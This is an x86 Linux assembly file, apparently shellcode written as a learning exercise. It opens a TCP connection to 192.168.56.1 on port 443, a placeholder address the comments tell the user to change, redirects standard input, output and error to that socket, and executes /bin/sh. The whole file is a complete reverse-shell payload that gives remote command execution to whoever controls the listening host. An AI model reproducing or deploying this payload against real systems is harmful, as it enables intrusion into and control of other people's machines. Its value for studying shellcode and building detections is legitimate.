BITS 32

  ; sockets calls in 32 bits:
  ; eax = 0x66(102) for socketcall, ebx indicates which socket function should be called
  ; eax will always be 0x66, ebx will change and ecx will point to the arguments of each function
  ; read man socketcall for more information
  ; 0x1 -> socket
  ; 0x2 -> accept
  ; 0x3 -> connect

  ; make socket
  push BYTE 0x66
  pop eax
  cdq ; 'sign extends' eax to edx, or in this case, zerout edx
  push BYTE 0x1
  pop ebx
  ; socket arguments (reverse order)
  push edx ; protocol = 0x0
  push ebx ; socket_type = 0x1
  push 0x2 ; socket_family = 0x2
  mov ecx, esp
  int 0x80

  xchg edx, eax ; eax -> 0 | edx -> socketfd

  ; connect to remote host
  mov al, 0x66
  inc ebx ; ebx was 1 and the structure need a 2 for AF_INET
  ; sock_addrin structure
  push 0x0138a8c0   ; CHANGE THIS | sin_addr = 192.168.56.01
  push WORD 0xbb01  ; sin_port = 443 (0x01bb)
  push WORD bx      ; sin_family = 0x2
  mov ecx, esp

  ; connect arguments
  push BYTE 16 ; sizeof(struct sockaddr_in)
  push ecx     ; struct sockaddr_in
  push edx     ; socket file descriptor
  mov ecx, esp
  inc ebx
  int 0x80

  ; call dup2 to redirect stdin,stdout,stderr to socket fd
  ; dup2(socketfd, {stdin|stdout|stderr})
  xchg ebx, edx   ; ebx -> socketfd | edx -> 3
  xchg edx, ecx   ; edx -> stack addr | ecx -> 3
dup2loop:
  mov BYTE al, 0x3f
  dec ecx
  int 0x80
  jnz dup2loop

  ; execute a shell
  ; ecx = 0
  mov al, 11
  cdq
  push ecx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
	int 0x80 
